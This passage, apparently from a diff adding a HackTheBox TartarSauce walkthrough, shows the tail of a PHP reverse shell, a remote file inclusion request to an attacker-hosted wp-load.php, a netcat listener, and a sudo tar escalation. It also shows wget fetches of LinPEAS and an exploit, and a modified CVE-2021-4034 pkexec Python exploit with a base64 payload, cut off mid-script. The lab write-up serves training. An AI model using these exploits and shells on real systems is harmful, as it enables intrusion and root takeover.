+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR READ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Like print, but does nothing if we&#39;ve daemonised ourself
+</span></span></span><span class="line"><span class="cl"><span class="c1">// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">print</span> <span class="s2">&#34;</span><span class="si">$string\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally we save this script as wp-load.php.</p>
+<p>Now we can host this from our machine using:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In another terminal tab/instance, we start a listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">1337</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With our malicious wp-load.php available and our listener active, we can send our forged request:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.6/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Going back to our listener, we have a shell!
+<img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/web-shell.png"
+	width="902"
+	height="173"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/web-shell_hua0090c5a23f9e295104a95927b2ee719_33290_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/web-shell_hua0090c5a23f9e295104a95927b2ee719_33290_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="web shell"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="521"
+		data-flex-basis="1251px"
+	
+></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="initial-enumeration">Initial Enumeration</h3>
+<p>Let&rsquo;s see who we are and what system we are on.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">cat /etc/*-release
+</span></span><span class="line"><span class="cl">cat /etc/passwd
+</span></span><span class="line"><span class="cl">uname -i
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/enum.png"
+	width="901"
+	height="1065"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/enum_hu93d8a6bf3badc1c23a0117c8f5365f8d_424563_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/enum_hu93d8a6bf3badc1c23a0117c8f5365f8d_424563_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="enum"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="84"
+		data-flex-basis="203px"
+	
+><br>
+We are www-data on an i686 machine running Ubuntu 16.04.4 LTS. We also see a user, onuma.</p>
+<h3 id="escalation-to-onuma">Escalation to onuma</h3>
+<p>I was very quickly reminded how fragile this shell is. Let&rsquo;s stabilize it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s see if we have access to run any binaries with sudo&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/sudo.png"
+	width="751"
+	height="146"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/sudo_hu4a1da80fbb3d158cfc21403a763f38b1_24721_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/sudo_hu4a1da80fbb3d158cfc21403a763f38b1_24721_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="sudo -l"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="514"
+		data-flex-basis="1234px"
+	
+><br>
+We can run tar as sudo with no password. (Another nod to the box name with the tar binary as well). Time to consult GTFObins!</p>
+<p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gtfobins.png"
+	width="852"
+	height="330"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gtfobins_hu6af923b38fa5f4aa9705b789e535e5e2_22129_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/gtfobins_hu6af923b38fa5f4aa9705b789e535e5e2_22129_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="gtfobins"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="258"
+		data-flex-basis="619px"
+	
+><br>
+tar does let us achieve privelege escalation to onuma!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -u onuma tar -cf /dev/null /dev/null --checkpoint<span class="o">=</span><span class="m">1</span> --checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/onuma.png"
+	width="911"
+	height="117"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/onuma_hua6c44ccdaf067f30102099199d59a01a_19074_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/onuma_hua6c44ccdaf067f30102099199d59a01a_19074_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="onuma"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="778"
+		data-flex-basis="1868px"
+	
+><br>
+Nice! We are onuma. Now I will again stabilize the shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="user-flag">User Flag</h4>
+<p>While we are here, let&rsquo;s grab the user flag!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /home/onuma/user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>User flag: <strong>eac421425bf43fc1b0ebf316339ffa9d</strong></p>
+<h3 id="escalation-to-root">Escalation to root</h3>
+<p>Alright time to figure out how to get root. First, I checked if we had any utilities for file transfer and we have wget.  Let&rsquo;s toss LinPEAS on the machine and see what we find.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /home/onuma
+</span></span><span class="line"><span class="cl">wget http://10.10.14.6/linpeas.sh
+</span></span><span class="line"><span class="cl">chmod +x linpeas.sh
+</span></span><span class="line"><span class="cl">./linpeas.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Right away I see:</p>
+<p><img src="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/cve.png"
+	width="231"
+	height="43"
+	srcset="/p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/cve_hu97a5f9bff12655648e05d016d1226503_9683_480x0_resize_box_3.png 480w, /p/hackthebox-tartarsauce-walkthrough-w/o-metasploit/cve_hu97a5f9bff12655648e05d016d1226503_9683_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="cve"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="537"
+		data-flex-basis="1289px"
+	
+><br>
+It looks like the machine is vulnerable to Polkit pkexec local privelege escalation</p>
+<p>I found the following exploit for this CVE: <a class="link" href="https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c"  target="_blank" rel="noopener"
+    >https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c</a></p>
+<p>Then on our Kali machine, I cross compiled it for the i686  architecture we saw earlier.</p>
+<p>First I checked which version of libc is on the victim machine and noted it was 2.23. Then, I downloaded the 2.23 header from <a class="link" href="https://github.com/wheybags/glibc_version_header"  target="_blank" rel="noopener"
+    >https://github.com/wheybags/glibc_version_header</a> and compiled with:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -m32 -march<span class="o">=</span>i686 -include header.h -o exp exp.c -static-libgcc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And then I downloaded the exploit from the victim machine using wget as onuma</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://10.10.14.6/exp
+</span></span><span class="line"><span class="cl">chmod +x exp
+</span></span><span class="line"><span class="cl">./exp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Unfortunately, I ran into a lot of issues here with library dependencies and linking. Time to check the LinPEAS output again for other privesc vectors.</p>
+<p>I remember from the LinPEAS scan that we have Python, however. I found a Python exploit for the same CVE at <a class="link" href="https://github.com/joeammond/CVE-2021-4034"  target="_blank" rel="noopener"
+    >https://github.com/joeammond/CVE-2021-4034</a>.</p>
+<p>It defaults to using an x64 payload so let&rsquo;s modify it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> msfvenom -p linux/x86/exec -f elf-so <span class="nv">PrependSetuid</span><span class="o">=</span><span class="nb">true</span> <span class="p">|</span> base64
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Base64-encoded Payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAA9gAAADQAAAB0AAAAAAAAADQAIAACACgAAgABAAEAAAAA
+</span></span><span class="line"><span class="cl">AAAAAAAAAAAAAAARAQAALAEAAAcAAAAAEAAAAgAAAAcAAADEAAAAxAAAAMQAAAAwAAAAMAAAAAAQ
+</span></span><span class="line"><span class="cl">AAABAAAABgAAAAAAAADEAAAAxAAAADAAAAAAAAAAAAAAAAgAAAAHAAAAAAAAAAMAAAAAAAAA9AAA
+</span></span><span class="line"><span class="cl">APQAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAD2AAAABQAAAPQAAAAGAAAA9AAAAAoAAAAAAAAA
+</span></span><span class="line"><span class="cl">CwAAAAAAAAAAAAAAAAAAAAAAMdtqF1jNgDHJ9+GwC2gvc2gAaC9iaW6J482A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Modified exploit with new payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># CVE-2021-4034 in Python</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Joe Ammond (joe@ammond.org)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># This was just an experiment to see whether I could get this to work</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># in Python, and to play around with ctypes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># This was completely cribbed from blasty&#39;s original C code:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># https://haxx.in/files/blasty-vs-pkexec.c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes.util</span> <span class="kn">import</span> <span class="n">find_library</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Payload, base64 encoded ELF shared object. Generate with:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># The PrependSetuid=true is important, without it you&#39;ll just get</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># a shell as the user and not root.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Should work with any msfvenom payload, tested with linux/x64/exec</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># and linux/x64/shell_reverse_tcp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># UPDATED WITH x86 PAYLOAD</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload_b64</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAA9gAAADQAAAB0AAAAAAAAADQAIAACACgAAgABAAEAAAAA
+</span></span></span><span class="line"><span class="cl"><span class="s1">AAAAAAAAAAAAAAARAQAALAEAAAcAAAAAEAAAAgAAAAcAAADEAAAAxAAAAMQAAAAwAAAAMAAAAAAQ
+</span></span></span><span class="line"><span class="cl"><span class="s1">AAABAAAABgAAAAAAAADEAAAAxAAAADAAAAAAAAAAAAAAAAgAAAAHAAAAAAAAAAMAAAAAAAAA9AAA
+</span></span></span><span class="line"><span class="cl"><span class="s1">APQAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAD2AAAABQAAAPQAAAAGAAAA9AAAAAoAAAAAAAAA
+</span></span></span><span class="line"><span class="cl"><span class="s1">CwAAAAAAAAAAAAAAAAAAAAAAMdtqF1jNgDHJ9+GwC2gvc2gAaC9iaW6J482A
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">payload_b64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Set the environment for the call to execve()</span>
+</span></span><span class="line"><span class="cl"><span class="n">environ</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">b</span><span class="s1">&#39;exploit&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">b</span><span class="s1">&#39;PATH=GCONV_PATH=.&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">b</span><span class="s1">&#39;LC_MESSAGES=en_US.UTF-8&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">b</span><span class="s1">&#39;XAUTHORITY=../LOL&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Find the C library to call execve() directly, as Python helpfully doesn&#39;t</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># allow us to call execve() with no arguments.</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="n">find_library</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Unable to find the C library, wtf?&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create the shared library from the payload</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Creating shared library for exploit code.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;payload.so&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Failed creating payload.so.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s1">&#39;payload.so&#39;</span><span class="p">,</span> <span class="mo">0o0755</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># make the GCONV_PATH directory</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s1">&#39;GCONV_PATH=.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">FileExistsError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] GCONV_PATH=. directory already exists, continuing.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Failed making GCONV_PATH=. directory.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create a temp exploit file</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;GCONV_PATH=./exploit&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Failed creating exploit file&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s1">&#39;GCONV_PATH=./exploit&#39;</span><span class="p">,</span> <span class="mo">0o0755</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create directory to hold gconf-modules configuration file</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s1">&#39;exploit&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">FileExistsError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] exploit directory already exists, continuing.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!] Failed making exploit directory.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
